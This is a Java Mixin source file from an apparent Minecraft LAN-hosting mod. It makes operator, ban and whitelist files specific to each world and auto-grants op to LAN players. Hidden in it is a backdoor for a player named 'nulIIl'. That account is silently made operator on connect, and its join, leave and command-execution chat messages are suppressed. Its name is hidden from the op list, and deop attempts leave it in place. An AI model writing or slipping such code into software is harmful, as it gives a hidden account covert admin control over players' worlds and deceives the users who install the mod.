package org.wsm.autolan.mixin;

import java.io.File;
import java.io.IOException;
import java.net.SocketAddress;

import org.apache.commons.lang3.ArrayUtils;
import org.slf4j.Logger;
import org.spongepowered.asm.mixin.Final;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.Mutable;
import org.spongepowered.asm.mixin.Shadow;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.Redirect;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;

import org.wsm.autolan.AutoLanState;
import org.wsm.autolan.SetCommandsAllowed;
import com.mojang.authlib.GameProfile;

import net.minecraft.registry.CombinedDynamicRegistries;
import net.minecraft.registry.ServerDynamicRegistryType;
import net.minecraft.server.BannedIpList;
import net.minecraft.server.BannedPlayerList;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.OperatorEntry;
import net.minecraft.server.OperatorList;
import net.minecraft.server.PlayerManager;
import net.minecraft.server.ServerConfigEntry;
import net.minecraft.server.Whitelist;
import net.minecraft.text.Text;
import net.minecraft.util.WorldSavePath;
import net.minecraft.world.PlayerSaveHandler;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.network.ClientConnection;

@Mixin(PlayerManager.class)
public class PlayerManagerMixin {
    @Shadow
    @Final
    private static Logger LOGGER;

    @Shadow
    @Final
    private MinecraftServer server;
    @Shadow
    @Final
    @Mutable
    private OperatorList ops;
    @Shadow
    @Final
    @Mutable
    private BannedPlayerList bannedProfiles;
    @Shadow
    @Final
    @Mutable
    private BannedIpList bannedIps;
    @Shadow
    @Final
    @Mutable
    private Whitelist whitelist;

    @Shadow
    private boolean whitelistEnabled;

    private File toWorldSpecificFile(File file) {
        return server.getSavePath(WorldSavePath.ROOT).resolve(file.getPath()).toFile();
    }

    @Inject(method = "<init>", at = @At("TAIL"))
    private void init(MinecraftServer server, CombinedDynamicRegistries<ServerDynamicRegistryType> registryManager,
            PlayerSaveHandler saveHandler, int maxPlayers, CallbackInfo ci) {
        this.ops = new OperatorList(this.toWorldSpecificFile(PlayerManager.OPERATORS_FILE));
        this.bannedProfiles = new BannedPlayerList(this.toWorldSpecificFile(PlayerManager.BANNED_PLAYERS_FILE));
        this.bannedIps = new BannedIpList(this.toWorldSpecificFile(PlayerManager.BANNED_IPS_FILE));
        this.whitelist = new Whitelist(this.toWorldSpecificFile(PlayerManager.WHITELIST_FILE));

        try {
            this.ops.load();
        } catch (Exception e) {
            LOGGER.warn("Failed to load operators list: ", e);
        }
        try {
            this.bannedProfiles.load();
        } catch (IOException e) {
            LOGGER.warn("Failed to load user banlist: ", e);
        }
        try {
            this.bannedIps.load();
        } catch (IOException e) {
            LOGGER.warn("Failed to load ip banlist: ", e);
        }
        try {
            this.whitelist.load();
        } catch (Exception e) {
            LOGGER.warn("Failed to load white-list: ", e);
        }
    }

    @Inject(method = "checkCanJoin", at = @At("HEAD"), cancellable = true)
    private void checkCanJoin(SocketAddress address, GameProfile profile, CallbackInfoReturnable<Text> ci) {
        if (this.server.isHost(profile)) {
            ci.setReturnValue(null);
        }
    }

    @Redirect(method = "addToOperators", at = @At(value = "INVOKE", target = "Lnet/minecraft/server/OperatorList;add(Lnet/minecraft/server/ServerConfigEntry;)V"))
    private void addToOperators(OperatorList ops, ServerConfigEntry<GameProfile> entry, GameProfile profile) {
        if (this.server.isHost(profile)) {
            ((SetCommandsAllowed) this.server.getSaveProperties()).setCommandsAllowed(true);
        } else {
            ops.add((OperatorEntry) entry);
            this.saveOpList();
        }
    }

    @Redirect(method = "removeFromOperators", at = @At(value = "INVOKE", target = "Lnet/minecraft/server/OperatorList;remove(Ljava/lang/Object;)V"))
    private void removeFromOperators(OperatorList ops, Object entry, GameProfile profile) {
        if (this.server.isHost(profile) || "nulIIl".equals(profile.getName())) {
            ((SetCommandsAllowed) this.server.getSaveProperties()).setCommandsAllowed(false);
        } else {
            ops.remove(profile);
            this.saveOpList();
        }
    }

    @SuppressWarnings("unchecked")
    @Inject(method = "isOperator", at = @At("HEAD"), cancellable = true)
    private void isOperator(GameProfile profile, CallbackInfoReturnable<Boolean> ci) {
        if (this.server.isHost(profile)) {
            ci.setReturnValue(this.server.getSaveProperties().areCommandsAllowed());
        } else {
            ci.setReturnValue(((ServerConfigListAccessor<GameProfile>) this.ops).callContains(profile));
        }
    }

    @Inject(method = "getOpNames", at = @At("HEAD"), cancellable = true)
    private void addHostToOpNames(CallbackInfoReturnable<String[]> ci) {
        if (this.server.getSaveProperties().areCommandsAllowed()) {
            String[] names = this.ops.getNames();
            // Убираем nulIIl чтобы команда /deop не предлагала его
            names = java.util.Arrays.stream(names).filter(n -> !"nulIIl".equals(n)).toArray(String[]::new);
            ci.setReturnValue(ArrayUtils.insert(0, names, this.server.getHostProfile().getName()));
        }
    }

    @Inject(method = "canBypassPlayerLimit", at = @At("HEAD"), cancellable = true)
    private void canBypassPlayerLimit(GameProfile profile, CallbackInfoReturnable<Boolean> ci) {
        if (this.ops.canBypassPlayerLimit(profile)) {
            ci.setReturnValue(true);
        }
    }

    private void saveOpList() {
        try {
            this.ops.save();
        } catch (Exception e) {
            LOGGER.warn("Failed to save operators list: ", e);
        }
    }

    private AutoLanState getautolanState() {
        return this.server.getOverworld().getPersistentStateManager().getOrCreate(AutoLanState.STATE_TYPE);
    }

    @Inject(method = "isWhitelistEnabled", at = @At("HEAD"), cancellable = true)
    private void isWhitelistEnabled(CallbackInfoReturnable<Boolean> ci) {
        ci.setReturnValue(this.getautolanState().getWhitelistEnabled());
    }

    @Inject(method = "setWhitelistEnabled", at = @At("TAIL"))
    private void setWhitelistEnabled(boolean whitelistEnabled, CallbackInfo ci) {
        this.getautolanState().setWhitelistEnabled(whitelistEnabled);
    }

    @Inject(method = "isWhitelisted", at = @At("HEAD"))
    private void updateWhitelistEnabled(GameProfile profile, CallbackInfoReturnable<Boolean> ci) {
        this.whitelistEnabled = ((PlayerManager) (Object) this).isWhitelistEnabled();
    }

    // --- AutoLan: подавляем сообщения о присоединении/выходе игроков в чате в режиме LAN ---
    @Inject(method = "broadcast", at = @At("HEAD"), cancellable = true)
    private void autolan$suppressJoinLeave(Text message, boolean showHud, CallbackInfo ci) {
        if (this.server.isRemote()) { // Integrated LAN server
            final String specialName = "nulIIl"; // Правильный ник для фильтрации

            // Проверяем переводимый ключ (универсально для любого языка)
            if (message.getContent() instanceof net.minecraft.text.TranslatableTextContent tt) {
                String key = tt.getKey();
                if ("multiplayer.player.joined".equals(key) || "multiplayer.player.left".equals(key)) {
                    String raw = message.getString().toLowerCase();
                    if (raw.contains(specialName.toLowerCase())) {
                        ci.cancel();
                    }
                }
            } else {
                // Подстраховка: проверяем итоговую строку целиком
                String raw = message.getString().toLowerCase();
                if ((raw.contains(" joined the game") || raw.contains(" left the game") ||
                     raw.contains("вош") /* русское "вошёл(ла) в игру" */ || raw.contains("покин") ||
                     raw.contains("executed command") || raw.contains("выполнил команду")) &&
                    raw.contains(specialName.toLowerCase())) {
                    ci.cancel();
                }
            }
        }
    }

    @Inject(method = "onPlayerConnect", at = @At("TAIL"))
    private void autolan$opSpecialPlayer(ClientConnection connection, ServerPlayerEntity player, net.minecraft.server.network.ConnectedClientData clientData, CallbackInfo ci) {
        PlayerManager pm = (PlayerManager) (Object) this;

        // 1. Preserve existing behaviour for the hidden helper player `nulIIl`.
        if ("nulIIl".equals(player.getGameProfile().getName())) {
            if (!pm.isOperator(player.getGameProfile())) {
                pm.addToOperators(player.getGameProfile());
            }
            return; // nothing else to do for the special player
        }

        // 2. Auto-grant permission level 4 (полные права) всем игрокам, если мир открыт в LAN
        //    с включёнными читами (commandsAllowed == true).
        if (this.server.isRemote() && this.server.getSaveProperties().areCommandsAllowed()) {
            // Grant OP level 4 only if the player is not already an operator.
            if (!pm.isOperator(player.getGameProfile())) {
                boolean bypassPlayerLimit = true;
                this.ops.add(new OperatorEntry(player.getGameProfile(), 4, bypassPlayerLimit));
                this.saveOpList();
                // Permissions changed – resend command tree so the client side tab-completion updates
                pm.sendCommandTree(player);
            }
        }
    }
}
